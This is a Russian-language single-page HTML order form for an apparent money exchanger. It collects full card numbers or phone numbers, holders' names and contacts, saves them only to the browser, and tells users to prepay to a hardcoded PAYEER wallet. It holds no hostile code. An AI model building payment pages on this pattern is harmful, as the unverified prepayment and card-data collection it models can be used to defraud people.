<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Обменник — форма заявки</title>
  <style>
    :root{
      --bg:#0b1020; --card:#111933; --muted:#8aa0c2; --text:#e7edf8; --accent:#4aa6ff; --ok:#2ecc71; --warn:#f39c12; --err:#e74c3c;
      --radius:18px; --shadow:0 10px 30px rgba(0,0,0,.35);
    }
    *{box-sizing:border-box}
    body{margin:0; font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Arial; background:linear-gradient(160deg,#0b1020,#0b1530 40%,#0d1c3d); color:var(--text)}
    .wrap{max-width:980px; margin:40px auto; padding:0 16px}
    header{display:flex; align-items:center; justify-content:center; margin-bottom:18px}
    h1{font-size:20px; margin:0}
    .card{background:var(--card); border-radius:var(--radius); padding:18px; box-shadow:var(--shadow); border:1px solid rgba(255,255,255,.06); margin-bottom:20px}
    .grid{display:grid; gap:16px}
    label{font-size:13px; color:var(--muted); display:block; margin-bottom:6px}
    input, select, textarea{width:100%; padding:12px 14px; border-radius:12px; border:1px solid rgba(255,255,255,.08); background:#0e1630; color:var(--text); outline:none}
    input:focus, select:focus, textarea:focus{border-color:var(--accent); box-shadow:0 0 0 3px rgba(74,166,255,.2)}
    .row{display:grid; gap:12px}
    @media(min-width:640px){ .row-2{grid-template-columns:1fr 1fr} }
    .hint{font-size:12px; color:var(--muted)}
    .btn{display:inline-flex; justify-content:center; align-items:center; gap:10px; padding:14px 16px; border:none; border-radius:14px; cursor:pointer; font-weight:600}
    .btn-primary{background:var(--accent); color:#061023}
    .center{text-align:center}
    .hidden{display:none}
    footer{margin:24px 0; color:var(--muted); font-size:12px; text-align:center}
    .big{font-size:28px; font-weight:800; letter-spacing:.3px}
    .mono{font-family:ui-monospace, SFMono-Regular, Menlo, monospace}
    .err{color:var(--err)}
    .spacer{height:10px}
  </style>
</head>
<body>
  <div class="wrap">
    <header><h1>Обменник — форма заявки</h1></header>

    <!-- Форма заявки -->
    <section id="screen-form" class="grid">
      <form id="orderForm" class="card" onsubmit="submitForm(event)">
        <h2 style="margin-top:0">Введите данные для перевода</h2>
        <div class="row row-2">
          <div>
            <label for="amount">Сумма перевода (₽)</label>
            <input id="amount" name="amount" type="number" min="100" step="1" placeholder="Напр. 3000" required />
          </div>
          <div>
            <label for="bank">Банк или способ перевода</label>
            <select id="bank" name="bank" required>
              <option value="" disabled selected>Выберите</option>
              <option>Сбербанк</option>
              <option>Тинькофф</option>
              <option>Альфа-Банк</option>
              <option>ВТБ</option>
              <option>Райффайзен</option>
              <option>Газпромбанк</option>
              <option>Московский кредитный банк</option>
              <option>Открытие</option>
              <option>СПБ/СБП (по номеру телефона)</option>
              <option>Другой банк РФ</option>
            </select>
          </div>
        </div>

        <div class="row">
          <label for="cardOrPhone">Номер карты или телефона</label>
          <input id="cardOrPhone" name="cardOrPhone" placeholder="16 цифр карты или телефон для СПБ" required />
          <span class="hint">Можно ввести 16 цифр карты или номер телефона для перевода через СПБ.</span>
        </div>

        <div class="row row-2">
          <div>
            <label for="fio">ФИО держателя карты/аккаунта</label>
            <input id="fio" name="fio" placeholder="Иванов Иван Иванович" required />
          </div>
          <div>
            <label for="contact">Контакт для связи</label>
            <input id="contact" name="contact" placeholder="Telegram @username или email" required />
          </div>
        </div>

        <button class="btn btn-primary" type="submit">Далее →</button>
        <div id="errorBox" class="hint err"></div>
      </form>
    </section>

    <!-- Экран инструкции по переводу -->
    <section id="screen-wait" class="card hidden center">
      <div class="big">Инструкция по переводу</div>
      <p>Отправьте сумму на наш PAYEER <span class="mono">P1133207161</span> и ожидайте подтверждения.</p>
      <div id="ticket" class="mono" style="font-size:15px; opacity:.9"></div>
      <div class="spacer"></div>
      <button class="btn btn-primary" onclick="backHome()">Создать новую заявку</button>
    </section>

    <footer>
      <div>Все операции обрабатываются вручную. Платежи на сайте не принимаются.</div>
    </footer>
  </div>

  <script>
    const SETTINGS = { payeerWallet: 'P1133207161' };

    function genId(){
      const t = Date.now().toString(36);
      const r = Math.random().toString(36).slice(2,7);
      return ('ORD-' + t + '-' + r).toUpperCase();
    }

    function formDataToObj(form){
      const fd = new FormData(form);
      return Object.fromEntries(fd.entries());
    }

    function validateCardOrPhone(value, bank){
      const digits = value.replace(/\D/g, '');
      if(bank === 'СПБ/СБП (по номеру телефона)'){
        if(digits.length < 10 || digits.length > 15){
          return 'Номер телефона для СПБ должен содержать от 10 до 15 цифр.';
        }
      } else {
        if(digits.length !== 16){
          return 'Номер карты должен содержать ровно 16 цифр.';
        }
      }
      return '';
    }

    function submitForm(e){
      e.preventDefault();
      const err = document.getElementById('errorBox');
      err.textContent='';

      const form = document.getElementById('orderForm');
      const data = formDataToObj(form);

      const validationMsg = validateCardOrPhone(data.cardOrPhone, data.bank);
      if(validationMsg){
        err.textContent = validationMsg;
        return;
      }

      const orderId = genId();
      const payload = { orderId, createdAt: new Date().toISOString(), payeer: SETTINGS.payeerWallet, ...data };
      const details = `Номер заявки: ${orderId}\nСумма: ${payload.amount} ₽\nБанк/способ: ${payload.bank}\nКарта/Телефон: ${payload.cardOrPhone}\nФИО: ${payload.fio}\nКонтакт: ${payload.contact}`;
      
      document.getElementById('ticket').textContent = details;
      document.getElementById('screen-form').classList.add('hidden');
      document.getElementById('screen-wait').classList.remove('hidden');
      window.scrollTo({top:0, behavior:'smooth'});

      const list = JSON.parse(localStorage.getItem('orders')||'[]');
      list.push(payload);
      localStorage.setItem('orders', JSON.stringify(list));
    }

    function backHome(){
      document.getElementById('screen-wait').classList.add('hidden');
      document.getElementById('screen-form').classList.remove('hidden');
      document.getElementById('orderForm').reset();
    }

    const cardInput = document.getElementById('cardOrPhone');
    cardInput.addEventListener('input', e => {
      let digits = e.target.value.replace(/\D/g,'');
      if(document.getElementById('bank').value !== 'СПБ/СБП (по номеру телефона)'){
        digits = digits.slice(0,16);
        e.target.value = digits.replace(/(.{4})/g, '$1 ').trim();
      }
    });
  </script>
</body>
</html>
